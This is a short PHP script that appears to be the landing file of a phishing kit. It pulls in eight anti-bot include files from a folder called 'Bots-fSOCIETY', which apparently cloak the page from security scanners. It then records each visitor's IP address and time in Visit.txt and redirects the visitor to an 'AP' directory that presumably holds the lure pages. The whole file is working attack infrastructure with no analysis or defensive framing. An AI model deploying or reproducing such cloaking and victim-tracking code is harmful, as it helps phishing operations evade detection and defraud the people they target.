<?php

include("./Bots-fSOCIETY/anti1.php");
include("./Bots-fSOCIETY/anti2.php");
include("./Bots-fSOCIETY/anti3.php");
include("./Bots-fSOCIETY/anti4.php");
include("./Bots-fSOCIETY/anti5.php");
include("./Bots-fSOCIETY/anti6.php");
include("./Bots-fSOCIETY/anti7.php");
include("./Bots-fSOCIETY/anti8.php");



$ip = getenv("REMOTE_ADDR");
$file = fopen("Visit.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
$src="AP";
header("location:$src");
?>
